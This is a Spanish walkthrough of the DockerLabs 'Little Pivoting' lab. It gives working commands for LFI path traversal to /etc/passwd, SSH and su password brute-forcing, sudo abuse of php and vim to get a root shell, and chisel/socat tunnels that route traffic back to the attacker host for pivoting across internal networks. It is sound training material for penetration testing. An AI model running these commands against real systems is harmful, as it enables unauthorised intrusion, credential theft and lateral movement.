# 🗺️ Mapa de Red

Para localizar la primera máquina realizamos un escaneo ARP sobre la interfaz de red del laboratorio. En entornos Docker como DockerLabs no disponemos de un rango de red concreto de antemano, así que usamos `arp-scan` sobre la interfaz del bridge de Docker para descubrir qué hosts están activos en el segmento local.

> [!tip] Descubrimiento de hosts activos con arp-scan
> ```bash
> sudo arp-scan -I br-2becb05f531e --localnet
> ```
> `-I br-2becb05f531e` — Especifica la **interfaz de red** sobre la que lanzar el escaneo ARP. En DockerLabs, la interfaz es un bridge de Docker cuyo nombre varía en cada entorno — identificable con `ip a` o `docker network ls`.
> `--localnet` — Escanea **toda la subred local** asociada a esa interfaz, calculando automáticamente el rango a partir de la IP y máscara de la interfaz.

![](assets/Little%20Pivoting-img-21-03-2026-1.png)

El escaneo revela **un único host activo**: `10.10.10.2`. Esta será nuestra primera máquina objetivo.

> [!info] Redes descubiertas durante el engagement
> | Red | Accesible desde | Método de pivoting |
> |---|---|---|
> | 10.10.10.0/24 | Atacante directo | — |
> | 20.20.20.0/24 | Máquina 1 (10.10.10.2) | Chisel reverse SOCKS5 |
> | 30.30.30.0/24 | Máquina 2 (20.20.20.3) | Chisel reverse SOCKS5 encadenado |

![](assets/Little%20Pivoting-img-24-03-2026-12.png)

![](assets/Little%20Pivoting-img-24-03-2026-11.png)

---

# 🖥️ Máquina 1 — 10.10.10.2

> [!info] 📋 Información de la Máquina
> **🖥️ OS:** Linux
> **🎯 IP:** 10.10.10.2
> **💀 Dificultad:**
> **🌐 Plataforma:** DockerLabs

## 🔍 Reconocimiento y Enumeración

Antes de comenzar con la enumeración activa, lanzamos un ping para verificar conectividad con la máquina objetivo. El valor del **TTL** nos permite intuir el sistema operativo: un TTL cercano a **128** indica Windows, mientras que uno cercano a **64** apunta a Linux.

> [!tip] Verificación de conectividad y detección de OS por TTL
> ```bash
> ping -c 1 10.10.10.2
> ```
> `-c 1` — Envía **un único paquete ICMP** y termina, en lugar de pingear indefinidamente.
> `10.10.10.2` — **IP objetivo** a la que se lanza el ping.

![](assets/Little%20Pivoting-img-21-03-2026-2.png)

Obtenemos respuesta con un TTL de **64**, lo que confirma que estamos ante una máquina **Linux**. Confirmada la conectividad, procedemos con la enumeración de puertos.

### 👁️ Enumeración con Nmap

#### 🔎 Enumeración de puertos

Comenzamos identificando qué puertos se encuentran abiertos sobre el rango completo de los 65535 posibles. Usamos un SYN Scan, que envía paquetes SYN sin completar el three-way handshake TCP — lo que lo hace más rápido y menos ruidoso que un TCP Connect Scan completo.

> [!tip] Escaneo de puertos completo y sigiloso
> ```bash
> nmap -sS -p- --open --min-rate 5000 -n -Pn 10.10.10.2 -vvv -oN ports_m1
> ```
> `-sS` — **SYN Scan** (half-open). Envía SYN, recibe SYN-ACK si el puerto está abierto o RST si está cerrado, sin completar nunca el handshake. Requiere privilegios de root.
> `-p-` — Escanea los **65535 puertos** posibles, desde el 1 hasta el 65535.
> `--open` — Muestra **únicamente los puertos abiertos**, filtrando los cerrados y filtrados.
> `--min-rate 5000` — Fuerza un mínimo de **5000 paquetes por segundo** para acelerar el escaneo.
> `-n` — Sin resolución DNS — evita latencia adicional y ruido en la red.
> `-Pn` — Sin ping previo — asume el host activo aunque ICMP esté bloqueado.
> `10.10.10.2` — **IP objetivo** del escaneo.
> `-vvv` — **Triple verbose** — muestra los puertos abiertos en tiempo real sin esperar al final.
> `-oN ports_m1` — Guarda el output en formato legible en el archivo `ports_m1`.

![](assets/Little%20Pivoting-img-21-03-2026-3.png)

El escaneo revela **dos puertos abiertos**: `22` (SSH) y `80` (HTTP).

#### 🔬 Enumeración de versiones y servicios

Con los puertos identificados, lanzamos un segundo escaneo más profundo apuntando únicamente a los puertos `22` y `80` para determinar qué servicios y versiones exactas corren en cada uno, ejecutando además los scripts NSE por defecto para obtener información adicional.

> [!tip] Detección de versiones y scripts sobre puertos seleccionados
> ```bash
> nmap -sC -sV -p22,80 --min-rate 5000 -n -Pn -vvv 10.10.10.2 -oN version_m1
> ```
> `-sC` — Lanza los **scripts por defecto** del motor NSE (Nmap Scripting Engine). Incluye detección de banners, enumeración básica de servicios y comprobaciones de configuraciones inseguras.
> `-sV` — **Detección de versiones** — envía probes adicionales para identificar el software exacto y su versión en cada puerto.
> `-p22,80` — Escanea **únicamente los puertos 22 y 80**, los descubiertos en el paso anterior.
> `--min-rate 5000` — Mínimo de **5000 paquetes por segundo**.
> `-n` — Sin resolución DNS.
> `-Pn` — Sin ping previo.
> `-vvv` — **Triple verbose**.
> `10.10.10.2` — **IP objetivo**.
> `-oN version_m1` — Guarda el output en el archivo `version_m1`.

![](assets/Little%20Pivoting-img-21-03-2026-4.png)

#### 🛡️ Enumeración de vulnerabilidades

Con los servicios y versiones identificados, lanzamos el conjunto de scripts de la categoría `vuln` de nmap. Estos scripts comprueban automáticamente si los servicios detectados presentan vulnerabilidades conocidas, dándonos pistas concretas sobre posibles vectores de explotación antes de pasar a la fase ofensiva.

> [!tip] Detección automática de vulnerabilidades con scripts NSE
> ```bash
> nmap --script vuln -p22,80 10.10.10.2 --min-rate 5000 -n -Pn -vvv -oN vuln_m1
> ```
> `--script vuln` — Categoría de scripts NSE que comprueba vulnerabilidades conocidas en los servicios detectados. Incluye checks de CVEs públicos, configuraciones inseguras y exposiciones de información.
> `-p22,80` — Apunta únicamente a los **puertos 22 y 80** ya identificados anteriormente.
> `10.10.10.2` — **IP objetivo** del escaneo.
> `--min-rate 5000` — Mínimo de **5000 paquetes por segundo**.
> `-n` — Sin resolución DNS.
> `-Pn` — Sin ping previo.
> `-vvv` — **Triple verbose**.
> `-oN vuln_m1` — Guarda el output en el archivo `vuln_m1`.

![](assets/Little%20Pivoting-img-21-03-2026-5.png)

### 🌐 Enumeración Web — Puerto 80

Al acceder a `http://10.10.10.2/` encontramos la página por defecto de Apache — el servidor web está operativo pero no hay contenido propio en la raíz. Antes de hacer fuzzing, obtenemos un fingerprint tecnológico del servidor con `whatweb` para confirmar tecnologías y versiones:

> [!info] **whatweb**
> Herramienta de fingerprinting web que identifica tecnologías usadas por un sitio: servidor web, frameworks, versiones de software, cabeceras HTTP, etc. Útil para identificar versiones exactas que puedan tener vulnerabilidades conocidas.

> [!tip] Fingerprinting tecnológico con whatweb
> ```bash
> whatweb http://10.10.10.2/
> ```

![](assets/Little%20Pivoting-img-21-03-2026-7.png)

El output confirma que se trata de un servidor **Apache**. Dado que la raíz no ofrece superficie de ataque, procedemos a hacer fuzzing de directorios para descubrir rutas ocultas:

> [!info] **gobuster**
> Herramienta de fuzzing web que realiza fuerza bruta sobre rutas y directorios de un servidor web usando un diccionario. Envía peticiones HTTP para cada entrada del diccionario y reporta las que devuelven códigos de respuesta válidos (200, 301, 302, etc.).

> [!tip] Fuzzing de directorios con gobuster
> ```bash
> gobuster dir -u http://10.10.10.2/ \
>     -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
>     -t 40 --no-error -o fuzzing
> ```
> `dir` — Modo de enumeración de directorios y archivos.
> `-u http://10.10.10.2/` — URL objetivo del fuzzing.
> `-w` — Diccionario a usar. `DirBuster-2007_directory-list-2.3-medium.txt` de SecLists es uno de los más completos para descubrimiento de directorios web.
> `-t 40` — **Threads**: 40 hilos paralelos para acelerar el proceso.
> `--no-error` — Suprime los mensajes de error de conexión — limpia el output.
> `-o fuzzing` — Guarda los resultados en el archivo `fuzzing`.

![](assets/Little%20Pivoting-img-21-03-2026-6.png)

Gobuster descubre el directorio `/shop`. Al acceder a `http://10.10.10.2/shop/` encontramos una página con un error que expone la existencia de un parámetro `archivo` en la URL. El hecho de que la aplicación intente incluir un archivo cuyo nombre proviene directamente de la URL es una señal inequívoca de una posible vulnerabilidad de **Local File Inclusion** — el vector que exploraremos a continuación.

![](assets/Little%20Pivoting-img-21-03-2026-8.png)

## 💥 Explotación

### 🔥 Local File Inclusion (LFI)

La URL `http://10.10.10.2/shop/?archivo=` indica que el backend PHP está incluyendo dinámicamente archivos del sistema de ficheros local en función del valor del parámetro `archivo`. Al no existir validación ni sanitización del input, podemos usar **path traversal** — secuencias `../` — para salir del directorio web y leer archivos arbitrarios del sistema. Probamos con `/etc/passwd`, el archivo que en sistemas Linux contiene la lista de usuarios del sistema:

> [!tip] Explotación de LFI con path traversal para leer /etc/passwd
> ```bash
> curl "http://10.10.10.2/shop/?archivo=../../../../etc/passwd"
> ```
> `archivo=../../../../etc/passwd` — Cada `../` sube un nivel en el árbol de directorios desde la ruta actual del script PHP. Con cuatro saltos salimos del directorio web y llegamos a la raíz del sistema `/`, desde donde especificamos la ruta absoluta al archivo objetivo.

![](assets/Little%20Pivoting-img-21-03-2026-9.png)

La vulnerabilidad se confirma — el contenido de `/etc/passwd` se devuelve en texto claro. Del output extraemos **dos usuarios con shell válida** (`/bin/bash`): `manchi` y `seller`. Los guardamos para el siguiente paso:
```bash
echo -e "manchi\nseller" > users.txt
```

### 🔑 Fuerza bruta SSH con Hydra

Con los usuarios identificados, intentamos obtener acceso al servicio SSH mediante fuerza bruta de contraseñas usando el diccionario `rockyou.txt`:

> [!info] **hydra**
> Herramienta de fuerza bruta de credenciales que soporta múltiples protocolos: SSH, FTP, HTTP, SMB, RDP, entre otros. Prueba combinaciones de usuario/contraseña de forma paralela y reporta las que tienen éxito.

> [!tip] Fuerza bruta SSH contra el usuario manchi
> ```bash
> hydra -l manchi -P /usr/share/wordlists/rockyou.txt -I ssh://10.10.10.2
> ```
> `-l manchi` — Usuario concreto contra el que probar las contraseñas. Se usa `-l` (minúscula) para un único usuario fijo.
> `-P /usr/share/wordlists/rockyou.txt` — Diccionario de contraseñas. `rockyou.txt` contiene más de 14 millones de contraseñas reales filtradas en brechas de datos.
> `-I` — Ignora el archivo de restore — comienza el ataque desde cero.
> `ssh://10.10.10.2` — Protocolo y objetivo del ataque.

![](assets/Little%20Pivoting-img-21-03-2026-10.png)

Hydra encuentra la contraseña del usuario `manchi`: **`lovely`**. Procedemos a conectarnos por SSH:

> [!tip] Acceso SSH con las credenciales obtenidas
> ```bash
> ssh manchi@10.10.10.2
> ```

![](assets/Little%20Pivoting-img-21-03-2026-11.png)

Obtenemos una shell interactiva como el usuario `manchi` en la Máquina 1.

## 🔼 Escalada de Privilegios

### 🔑 Movimiento lateral al usuario seller con fuerza bruta de su

Desde la shell de `manchi`, intentamos movernos lateralmente al usuario `seller` — el otro usuario con shell válida identificado en el `/etc/passwd`. No disponemos de su contraseña, pero al tener acceso local al sistema podemos usar una herramienta que realiza fuerza bruta directamente sobre el comando `su`, que es el mecanismo nativo de Linux para cambiar de usuario:

> [!info] **multi-su_force** 📄 [github.com/Maciferna/multi-Su_Force](https://github.com/Maciferna/multi-Su_Force)
> Script bash que automatiza la fuerza bruta del comando `su` en sistemas Linux. A diferencia de Hydra, que ataca servicios de red, esta herramienta opera directamente sobre el sistema comprometido probando contraseñas mediante `su` — especialmente útil cuando el único vector disponible es la shell local.

> [!tip] Descargar multi-su_force y rockyou en la máquina víctima
> ```bash
> wget https://raw.githubusercontent.com/Maciferna/multi-Su_Force/main/multi-su_force.sh
> chmod 755 multi-su_force.sh
> wget https://weakpass.com/wordlists/rockyou.txt
> ```
> `chmod 755` — Da permisos de ejecución al script — sin este paso el sistema operativo lo rechazará al intentar ejecutarlo.

> [!tip] Ejecutar fuerza bruta de su contra el usuario seller
> ```bash
> ./multi-su_force.sh rockyou.txt seller
> ```

![](assets/Little%20Pivoting-img-21-03-2026-12.png)

La herramienta encuentra la contraseña del usuario `seller`: **`qwerty`**. Nos movemos al usuario:
```bash
su seller
# Contraseña: qwerty
```

![](assets/Little%20Pivoting-img-21-03-2026-14.png)

### ⚡ Escalada a root via sudo + PHP (GTFOBins)

Con acceso como `seller`, ejecutamos `sudo -l` para ver qué binarios puede ejecutar este usuario con privilegios elevados — siempre es el primer comando tras ganar acceso a un nuevo usuario:

> [!tip] Verificar permisos sudo del usuario seller
> ```bash
> sudo -l
> ```

![](assets/Little%20Pivoting-img-21-03-2026-15.png)

El output revela que `seller` puede ejecutar `/usr/bin/php` como `root` sin contraseña (`NOPASSWD`). Consultamos **GTFOBins** para identificar el método de abuso:

> [!info] **GTFOBins** 📄 [gtfobins.github.io](https://gtfobins.github.io)
> Base de datos de binarios Unix que pueden ser abusados para escalar privilegios cuando se tienen permisos especiales sobre ellos — sudo, SUID, capabilities. Para cada binario documenta los métodos de explotación con los comandos exactos listos para usar.

![](assets/Little%20Pivoting-img-21-03-2026-16.png)

GTFOBins confirma que PHP puede ejecutar comandos del sistema operativo mediante `system()`. Como podemos invocar PHP como root, le pedimos que ejecute una shell interactiva:

> [!tip] Escalar a root abusando del permiso sudo sobre PHP
> ```bash
> sudo -u root /usr/bin/php -r 'system("/bin/sh -i");'
> ```
> `sudo -u root` — Ejecuta el comando siguiente en el contexto del usuario `root`.
> `/usr/bin/php` — El intérprete PHP — el binario para el que tenemos permiso sudo.
> `-r 'system("/bin/sh -i");'` — Ejecuta código PHP inline. `system()` es una función PHP que ejecuta comandos del sistema operativo — le pasamos `/bin/sh -i` para obtener una shell interactiva que hereda el contexto de root.

![](assets/Little%20Pivoting-img-21-03-2026-17.png)

Somos **root** en la Máquina 1.

> [!important] Para el pivoting no es estrictamente necesario ser root — cualquier usuario con acceso a la red interna es suficiente para establecer el túnel. Sin embargo, disponer de root facilita enormemente el trabajo: permite instalar herramientas, leer configuraciones del sistema y garantiza que no habrá restricciones de permisos al ejecutar binarios como chisel o socat.

---

# 🔗 Pivoting — Máquina 1 → Máquina 2

## 🗺️ Descubrimiento de la red interna

Una vez comprometida la Máquina 1 con acceso root, el primer paso es enumerar sus interfaces de red para identificar segmentos internos inaccesibles desde el atacante. Dado que la máquina no tiene instaladas herramientas estándar como `ip` o `ifconfig`, usamos `hostname -I` — disponible en prácticamente cualquier sistema Linux moderno:

> [!tip] Descubrir todas las IPs asignadas al sistema
> ```bash
> hostname -I
> ```
> `hostname -I` — Muestra todas las direcciones IP asignadas a las interfaces de red del sistema en una sola línea. No requiere ninguna herramienta de red adicional — lee directamente del kernel.

![](assets/Little%20Pivoting-img-23-03-2026-1.png)

El output revela **dos IPs**: `10.10.10.2` — la interfaz conocida — y `20.20.20.2` — una segunda interfaz conectada a un segmento completamente nuevo e inaccesible desde nuestra máquina atacante. Este es el segmento donde vive la Máquina 2.

## 🔍 Descubrimiento de hosts en la red 20.20.20.0/24

Con el nuevo segmento identificado, realizamos un ping sweep con herramientas nativas de bash para descubrir qué hosts están activos, dado que no disponemos de nmap ni herramientas de red en la víctima:

> [!tip] Ping sweep sobre la red 20.20.20.0/24 desde la Máquina 1
> ```bash
> seq 1 254 | xargs -P 50 -I HOST bash -c \
>     "ping -c 1 20.20.20.HOST &>/dev/null && echo 'Host descubierto: 20.20.20.HOST'"
> ```
> `seq 1 254` — Genera la secuencia numérica del 1 al 254 — todos los hosts posibles en un /24.
> `xargs -P 50` — Ejecuta hasta **50 procesos en paralelo** — sin paralelismo el sweep sería extremadamente lento.
> `-I HOST` — Define `HOST` como placeholder sustituido por cada número de la secuencia.
> `ping -c 1` — Un único paquete ICMP por host.
> `&>/dev/null` — Silencia los pings fallidos.
> `&& echo` — Muestra el mensaje solo si el ping tuvo éxito.

![](assets/Little%20Pivoting-img-23-03-2026.png)

El sweep descubre un único host activo: **`20.20.20.3`** — la Máquina 2.

## 🚇 Preparación de herramientas — Chisel y Socat

Antes de establecer el túnel necesitamos tener disponibles en la Máquina 1 los binarios de `chisel` y `socat`. Chisel creará el túnel SOCKS5 y socat actuará como redirector para exponer servicios internos directamente desde Kali. Descargamos ambos en el atacante y los transferimos a la Máquina 1 mediante un servidor HTTP temporal:

> [!tip] Descargar chisel y socat en el atacante
> ```bash
> # Chisel — binario precompilado para Linux x64
> wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
> gunzip chisel_linux_amd64.gz && mv chisel_linux_amd64 chisel && chmod +x chisel
>
> # Socat — binario estático precompilado
> wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
> chmod +x socat
> ```

> [!tip] Servir los binarios desde el atacante y descargarlos en la Máquina 1
> ```bash
> # En el atacante
> python3 -m http.server 8080
>
> # En la Máquina 1 como root
> wget http://192.168.0.38:8080/chisel && chmod +x chisel
> wget http://192.168.0.38:8080/socat && chmod +x socat
> ```
> `python3 -m http.server 8080` — Levanta un servidor HTTP en el directorio actual sirviendo todos los archivos presentes. Es el método más rápido para transferir binarios a una máquina comprometida.
> `chmod +x` — Da permisos de ejecución a los binarios descargados — imprescindible antes de ejecutarlos.

## 🚇 Configuración del túnel Chisel — Primer salto

Para poder atacar la Máquina 2 desde Kali necesitamos enrutar nuestro tráfico a través de la Máquina 1. Usamos Chisel en modo **reverse** con proxy SOCKS5: el servidor corre en el atacante y el cliente en el pivot, de modo que la conexión de control la inicia el pivot hacia fuera — eludiendo así firewalls que bloquean conexiones entrantes al pivot pero permiten salientes.

Primero lanzamos el servidor chisel en el atacante:

> [!tip] Lanzar el servidor chisel en modo reverse en el atacante
> ```bash
> ./chisel server --reverse -p 10000 --socks5
> ```
> `server` — Modo servidor: espera conexiones WebSocket entrantes de clientes chisel.
> `--reverse` — Habilita el modo reverse — permite que los clientes creen proxies SOCKS5 en el servidor.
> `-p 10000` — Puerto donde el servidor chisel escuchará las conexiones del cliente pivot.
> `--socks5` — Habilita la creación de proxies SOCKS5 por parte de los clientes.

![](assets/Little%20Pivoting-img-23-03-2026-3.png)

A continuación conectamos el cliente desde la Máquina 1:

> [!tip] Conectar el cliente chisel desde la Máquina 1 al servidor del atacante
> ```bash
> ./chisel client 192.168.0.38:10000 R:1080:socks
> ```
> `client` — Modo cliente: conecta al servidor chisel estableciendo el túnel WebSocket.
> `192.168.0.38:10000` — IP y puerto del servidor chisel en el atacante.
> `R:1080:socks` — Tunnel specification: `R` indica reverse, `1080` es el puerto donde se creará el proxy SOCKS5 en el atacante, `socks` activa el proxy. Especificamos el puerto explícitamente para tener control total sobre qué puerto ocupa cada túnel — imprescindible en engagements con múltiples pivots.

![](assets/Little%20Pivoting-img-23-03-2026-4.png)

Con el túnel activo, configuramos proxychains para que use el proxy SOCKS5 recién creado. Este paso es fundamental — es lo que permite a todas nuestras herramientas en Kali enrutar su tráfico a través del pivot:

> [!tip] Configurar proxychains.conf para el primer salto
> ```bash
> sudo nano /etc/proxychains.conf
> ```

> [!important] En engagements con múltiples pivots hay dos reglas de proxychains que nunca deben ignorarse. La primera es usar siempre **`dynamic_chain`** en lugar de `strict_chain` — permite encadenar múltiples proxies en serie de forma flexible y tolera fallos. La segunda es que los proxies en el `[ProxyList]` deben estar ordenados **del más cercano al más lejano** — proxychains los encadena en el orden en que aparecen de arriba a abajo, por lo que un orden incorrecto rompe completamente el encadenamiento y el tráfico nunca llega a su destino.

El archivo debe quedar así para el primer salto:
```
dynamic_chain

[ProxyList]
socks5 127.0.0.1 1080
```
`dynamic_chain` — Encadena los proxies del `[ProxyList]` en orden de arriba a abajo. Imprescindible para multi-hop.
`socks5 127.0.0.1 1080` — El proxy SOCKS5 creado por chisel que enruta el tráfico a través de la Máquina 1 hacia la red `20.20.20.0/24`.

![](assets/Little%20Pivoting-img-23-03-2026-2.png)

El túnel está activo y proxychains configurado. Cualquier comando precedido de `proxychains` en Kali enrutará su tráfico transparentemente a través de la Máquina 1 hacia la red `20.20.20.0/24`.

---

# 🖥️ Máquina 2 — 20.20.20.3

> [!info] 📋 Información de la Máquina
> **🖥️ OS:** Linux
> **🎯 IP:** 20.20.20.3
> **💀 Dificultad:**
> **🌐 Plataforma:** DockerLabs
> **🔗 Acceso vía:** Pivot desde Máquina 1 (10.10.10.2) mediante Chisel reverse SOCKS5

## 🔍 Reconocimiento y Enumeración

> [!important] La red `20.20.20.0/24` es completamente inaccesible desde el atacante de forma directa. Todo el tráfico hacia esta máquina debe pasar a través del túnel chisel establecido en la Máquina 1. Todos los comandos de enumeración deben ejecutarse con `proxychains` delante.

### 👁️ Enumeración con Nmap

#### 🔎 Enumeración de puertos

A diferencia del escaneo directo sobre la Máquina 1, aquí el tráfico viaja encapsulado en el proxy SOCKS5 de chisel. Esto impone dos restricciones técnicas: debemos usar **TCP Connect Scan** (`-sT`) porque proxychains no soporta el envío de paquetes TCP parciales que requiere el SYN scan, y debemos deshabilitar el ping previo (`-Pn`) porque ICMP no viaja a través de proxychains.

> [!tip] Escaneo de puertos a través del proxy SOCKS5
> ```bash
> proxychains nmap -sT -Pn -p- --open --min-rate 5000 -n 20.20.20.3 -vvv -oN ports_m2 2>/dev/null
> ```
> `proxychains` — Intercepta las conexiones de nmap y las redirige al proxy SOCKS5 de chisel en `127.0.0.1:1080` → túnel WebSocket → Máquina 1 → `20.20.20.3`.
> `-sT` — **TCP Connect Scan** — obligatorio con proxychains. Completa el three-way handshake completo.
> `-Pn` — Sin ping ICMP previo — ICMP no funciona a través de proxychains.
> `-p-` — Escanea los **65535 puertos** posibles.
> `--open` — Muestra **únicamente los puertos abiertos**.
> `2>/dev/null` — Suprime los mensajes internos de proxychains para limpiar el output.
> `-oN ports_m2` — Guarda el output en el archivo `ports_m2`.

![](assets/Little%20Pivoting-img-23-03-2026-5.png)

El escaneo revela **dos puertos abiertos**: `22` (SSH) y `80` (HTTP).

#### 🔬 Enumeración de versiones y servicios

> [!tip] Detección de versiones y scripts a través del proxy SOCKS5
> ```bash
> proxychains nmap -sT -sV -sC -Pn -p22,80 --min-rate 5000 -n 20.20.20.3 -oN version_m2 2>/dev/null
> ```
> `-sT` — TCP Connect Scan obligatorio con proxychains.
> `-sV` — **Detección de versiones** de los servicios en cada puerto.
> `-sC` — Scripts NSE por defecto.
> `-p22,80` — Puertos descubiertos en el escaneo anterior.
> `-oN version_m2` — Guarda el output en el archivo `version_m2`.

![](assets/Little%20Pivoting-img-23-03-2026-6.png)

### 🌐 Enumeración Web — Puerto 80

Aunque el proxy SOCKS5 de chisel permite enrutar tráfico TCP arbitrario, los navegadores web no soportan proxychains de forma nativa. Para poder visualizar y fuzzear la web de la Máquina 2 directamente desde Kali, usamos **socat en la Máquina 1 como redirector**: escucha en un puerto accesible desde Kali y reenvía el tráfico al servicio de la Máquina 2. Creamos dos redirectores simultáneos — uno para HTTP y otro para SSH — lanzándolos en background para no bloquear el terminal:

> [!tip] Crear redirectores socat en la Máquina 1 para exponer servicios de la Máquina 2
> ```bash
> # En la Máquina 1 como root
> ./socat TCP4-LISTEN:8080,fork,reuseaddr TCP4:20.20.20.3:80 &
> ./socat TCP4-LISTEN:2222,fork,reuseaddr TCP4:20.20.20.3:22 &
> ```
> `TCP4-LISTEN:8080` — Socat escucha en el puerto `8080` de la Máquina 1 — accesible desde Kali como `10.10.10.2:8080`.
> `fork` — Crea un proceso hijo por cada conexión entrante — permite múltiples conexiones simultáneas sin que socat termine tras la primera.
> `reuseaddr` — Permite reusar el puerto inmediatamente si socat se reinicia — evita el error "Address already in use".
> `TCP4:20.20.20.3:80` — Todo el tráfico recibido se reenvía al puerto 80 de la Máquina 2.
> `&` — Lanza socat en background — libera el terminal para continuar trabajando.
> El segundo socat hace lo mismo para SSH: `2222` en la Máquina 1 → `22` en `20.20.20.3`.

![](assets/Little%20Pivoting-img-23-03-2026-7.png)

Con los redirectores activos, accedemos al servicio web de la Máquina 2 directamente desde el navegador de Kali apuntando a `http://10.10.10.2:8080`:

![](assets/Little%20Pivoting-img-23-03-2026-8.png)

Visualizamos la página de Apache de la Máquina 2. Procedemos con el fuzzing de directorios apuntando al puerto redirigido por socat:

> [!tip] Fuzzing de directorios con gobuster a través del redirector socat
> ```bash
> gobuster dir \
>     -u http://10.10.10.2:8080/ \
>     -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
>     --no-error -o fuzzing_m2 -x php,txt,html
> ```
> `-u http://10.10.10.2:8080/` — URL apuntando a la Máquina 1 en el puerto redirigido por socat hacia `20.20.20.3:80`. Gobuster no sabe que hay un redirector de por medio — ve directamente el contenido de la Máquina 2.
> `-x php,txt,html` — Extiende el fuzzing buscando también archivos con estas extensiones, no solo directorios.
> `-o fuzzing_m2` — Guarda los resultados en el archivo `fuzzing_m2`.

![](assets/Little%20Pivoting-img-23-03-2026-9.png)

Gobuster descubre el archivo `secret.php`. Al acceder a `http://10.10.10.2:8080/secret.php` encontramos lo siguiente:

![](assets/Little%20Pivoting-img-23-03-2026-10.png)

La página filtra directamente el nombre de usuario **`mario`** — un dato crítico que usaremos para el ataque de fuerza bruta SSH.

## 💥 Explotación

### 🔑 Fuerza bruta SSH con Hydra a través del redirector socat

Con el usuario `mario` identificado, realizamos fuerza bruta contra el SSH de la Máquina 2. Dado que el SSH de `20.20.20.3:22` está expuesto en `10.10.10.2:2222` gracias al redirector socat, apuntamos hydra directamente a esa combinación — no necesitamos proxychains porque el redirector socat hace la traducción de forma transparente:

> [!tip] Fuerza bruta SSH contra mario a través del redirector socat
> ```bash
> hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.2 -s 2222 -I
> ```
> `-l mario` — Usuario objetivo identificado en `secret.php`.
> `-P /usr/share/wordlists/rockyou.txt` — Diccionario `rockyou.txt`.
> `ssh://10.10.10.2` — Apuntamos a la IP de la Máquina 1 donde socat redirige el SSH de la Máquina 2.
> `-s 2222` — Puerto personalizado — el `2222` de la Máquina 1 que socat reenvía al `22` de `20.20.20.3`.
> `-I` — Ignora el archivo de restore — comienza desde cero.

![](assets/Little%20Pivoting-img-23-03-2026-13.png)

Hydra encuentra la contraseña del usuario `mario`: **`chocolate`**. Accedemos por SSH a través del mismo redirector socat:

> [!tip] Acceso SSH a la Máquina 2 a través del redirector socat
> ```bash
> ssh mario@10.10.10.2 -p 2222
> ```
> `mario@10.10.10.2` — Conectamos a la Máquina 1 en el puerto `2222` — socat reenvía la conexión transparentemente a `20.20.20.3:22`.
> `-p 2222` — Puerto donde socat está escuchando en la Máquina 1.

![](assets/Little%20Pivoting-img-23-03-2026-14.png)

Obtenemos una shell interactiva como `mario` en la Máquina 2 (`20.20.20.3`).

## 🔼 Escalada de Privilegios

### ⚡ Escalada a root via sudo + vim (GTFOBins)

Como siempre, lo primero tras ganar acceso es verificar los permisos sudo del usuario actual:

> [!tip] Verificar permisos sudo del usuario mario
> ```bash
> sudo -l
> ```

![](assets/Little%20Pivoting-img-23-03-2026-15.png)

El output revela que `mario` puede ejecutar `/usr/bin/vim` como `root` sin contraseña (`NOPASSWD`). Vim incluye la capacidad de ejecutar comandos del sistema directamente desde su modo de comandos — un vector de escalada documentado en GTFOBins. El comando `-c` permite pasarle instrucciones a vim al abrirse, y el prefijo `!` dentro de vim ejecuta comandos del shell externo:

> [!tip] Escalar a root abusando del permiso sudo sobre vim
> ```bash
> sudo vim -c ':!bash'
> ```
> `sudo vim` — Ejecuta vim en el contexto de root gracias al permiso sudo.
> `-c ':!bash'` — Al abrirse vim ejecuta el comando `:!bash`. En vim, `!` lanza un comando del shell externo — en este caso `bash`. Como vim se ejecuta como root, la bash resultante hereda ese contexto de privilegios.

![](assets/Little%20Pivoting-img-23-03-2026-17.png)

Somos **root** en la Máquina 2.

---

# 🔗 Pivoting — Máquina 2 → Máquina 3

## 🗺️ Descubrimiento de la red interna

Repetimos el proceso de enumeración de interfaces en la Máquina 2 para identificar si existe un tercer segmento de red:

> [!tip] Descubrir todas las IPs asignadas a la Máquina 2
> ```bash
> hostname -I
> ```

![](assets/Little%20Pivoting-img-23-03-2026-19.png)

El output confirma **dos interfaces**: `20.20.20.3` — la red desde la que accedemos — y `30.30.30.2` — un tercer segmento completamente nuevo. La Máquina 3 estará en la red `30.30.30.0/24`.

## 🚇 Preparación de herramientas en la Máquina 2

Necesitamos trasladar chisel y socat a la Máquina 2 para poder establecer el segundo túnel. El procedimiento es idéntico al anterior — montamos un servidor HTTP en la Máquina 1 (que ya tiene los binarios) y los descargamos desde la Máquina 2:

> [!tip] Transferir chisel y socat a la Máquina 2 desde la Máquina 1
> ```bash
> # En la Máquina 1 — servir los binarios
> python3 -m http.server 8888
>
> # En la Máquina 2 como root
> wget http://20.20.20.2:8888/chisel && chmod +x chisel
> wget http://20.20.20.2:8888/socat && chmod +x socat
> ```

![](assets/Little%20Pivoting-img-24-03-2026.png)

## 🚇 Configuración del túnel Chisel — Segundo salto

La Máquina 2 solo ve la red `20.20.20.0/24` — no tiene ruta directa hacia Kali (`192.168.0.38`). Para que pueda conectar al servidor chisel de Kali necesitamos un relay intermedio: usamos **socat en la Máquina 1** para escuchar en un puerto accesible desde la Máquina 2 y reenviar esas conexiones al servidor chisel de Kali. De esta forma la Máquina 2 cree que conecta a la Máquina 1, pero en realidad su conexión llega al servidor chisel de Kali a través del relay.

Primero creamos el relay socat en la Máquina 1:

> [!tip] Crear relay socat en la Máquina 1 que reenvía hacia el servidor chisel de Kali
> ```bash
> # En la Máquina 1 como root
> ./socat TCP-LISTEN:10001,fork,reuseaddr TCP:192.168.0.38:10000 &
> ```
> `TCP-LISTEN:10001` — Socat escucha en el puerto `10001` de la Máquina 1 — accesible desde la Máquina 2 como `20.20.20.2:10001`.
> `TCP:192.168.0.38:10000` — Todo lo que llegue al `10001` se reenvía al servidor chisel de Kali en el puerto `10000`.

A continuación conectamos el cliente chisel desde la Máquina 2 apuntando al relay de la Máquina 1:

> [!tip] Conectar el cliente chisel desde la Máquina 2 a través del relay de M1
> ```bash
> # En la Máquina 2 como root
> ./chisel client 20.20.20.2:10001 R:1081:socks
> ```
> `20.20.20.2:10001` — IP de la Máquina 1 y puerto del relay socat. La conexión llega a la Máquina 1 y socat la reenvía al servidor chisel de Kali.
